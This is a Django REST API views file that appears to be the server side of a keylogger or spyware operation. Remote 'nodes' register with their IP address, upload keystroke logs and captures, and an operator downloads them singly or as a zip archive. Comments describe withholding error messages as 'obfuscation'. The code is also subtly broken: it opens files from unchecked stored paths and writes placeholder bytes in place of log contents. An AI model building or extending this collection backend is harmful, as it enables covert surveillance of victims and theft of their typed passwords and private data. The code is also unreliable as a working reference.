from django.shortcuts import get_object_or_404
from django.http import FileResponse
from django.utils import timezone

from rest_framework import viewsets, status
from rest_framework.response import Response
from django.db.models import Q

from funguy_api.views.utils import get_ip
from ..serializers import *
from ..models import *

from zipfile import ZipFile
from io import BytesIO
import bcrypt


class NodeViewSet(viewsets.ViewSet):
    serializer_class = NodeSerializer

    def list(self, request):
        queryset = Node.objects.all()
        serializer = NodeSerializer(queryset, many=True)
        return Response(serializer.data)

    def retrieve(self, request, pk=None):
        uuid = request.query_params["uuid"]

        queryset = Node.objects.all()
        node = get_object_or_404(queryset, uuid=uuid)
        serializer = NodeSerializer(node)
        return Response(serializer.data)

    def create(self, request):
        # support creation of hash of mouse/mic random input
        request.data["ipv4"] = get_ip(request)

        # generate hash_sum
        random_input = request.data["random_input"].encode("utf-8")

        hashed_random = bcrypt.hashpw(random_input, bcrypt.gensalt(10))
        print(hashed_random)

        request.data["hash_sum"] = hashed_random.decode("utf-8")

        serializer = NodeSerializer(data=request.data)
        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        # don't return errors = obfuscation
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

    def update(self, request, pk=None):
        node = get_object_or_404(Node, uuid=request.headers["uuid"])

        node.last_seen = timezone.now()
        node.save()

        serializer = NodeSerializer(node, data=request.data)
        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data, status=status.HTTP_200_OK)
        # don't return errors = obfuscation
        return Response(status=status.HTTP_400_BAD_REQUEST)

    def partial_update(self, request, pk=None):
        node = get_object_or_404(Node, uuid=request.headers["uuid"])

        node.last_seen = timezone.now()
        node.save()

        serializer = NodeSerializer(node, data=request.data, partial=True)
        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data, status=status.HTTP_200_OK)
        # don't return errors = obfuscation
        return Response(status=status.HTTP_400_BAD_REQUEST)

    def destroy(self, request, pk=None):
        node = get_object_or_404(Node, uuid=request.headers["uuid"])
        node.delete()
        return Response(status=status.HTTP_204_NO_CONTENT)


class KeylogViewSet(viewsets.ViewSet):
    def create(self, request):
        node = get_object_or_404(Node, uuid=request.headers["uuid"])

        node.last_seen = timezone.now()
        node.save()

        serializer = KeylogSerializer(data=request.data)
        if serializer.is_valid():
            serializer.save(node=node)
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        # don't return errors = obfuscation
        return Response(status=status.HTTP_400_BAD_REQUEST)

    def retrieve(self, request, pk=None):
        node = get_object_or_404(Node, uuid=request.query_params["uuid"])

        # get latest keylog
        try:
            # get latest keylog object
            keylog = Keylog.objects.filter(node=node).latest("timestamp")
            serializer = KeylogSerializer(keylog)

            return Response(serializer.data, status=status.HTTP_200_OK)
        except TypeError:
            queryset = Keylog.objects.filter(node=node)
            serializer = KeylogSerializer(queryset, many=True)

            return Response(serializer.data, status=status.HTTP_200_OK)

    def list(self, request):
        node = get_object_or_404(Node, uuid=request.query_params["uuid"])

        queryset = Keylog.objects.filter(node=node)
        serializer = KeylogSerializer(queryset, many=True)

        # compile all keylogs into a zip archive
        log_paths = []

        for keylog_obg in serializer.data:
            log_paths.append(f'.{keylog_obg["log_file"]}')

        archive = BytesIO()

        with ZipFile(archive, "w") as zip:
            for log in log_paths:
                zip.open(log, 'w').write(b'log')

        zip_path = f'nodes/{node.uuid}/keylogs/keylogs.zip'
        with open(zip_path, "wb") as f:
            f.write(archive.getbuffer())

        archive.close

        return FileResponse(open(zip_path, 'rb'), as_attachment=True, filename="keylogs.zip")


class CaptureViewSet(viewsets.ViewSet):
    def create(self, request):
        node = get_object_or_404(Node, uuid=request.headers["uuid"])

        node.last_seen = timezone.now()
        node.save()

        serializer = CaptureSerializer(data=request.data)
        if serializer.is_valid():
            serializer.save(node=node)
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        # don't return errors = obfuscation
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

    def retrieve(self, request, pk=None):
        node = get_object_or_404(Node, uuid=request.query_params["uuid"])
        type = request.query_params["type"]

        # retrieve only latest capture
        capture = Capture.objects.filter(
            node=node, type=type).latest("timestamp")
        serializer = CaptureSerializer(capture)

        # return the image
        # MAKE SURE THIS ISN'T RCE
        image = open(f'.{serializer.data["capture"]}', 'rb')
        return FileResponse(image, as_attachment=True)
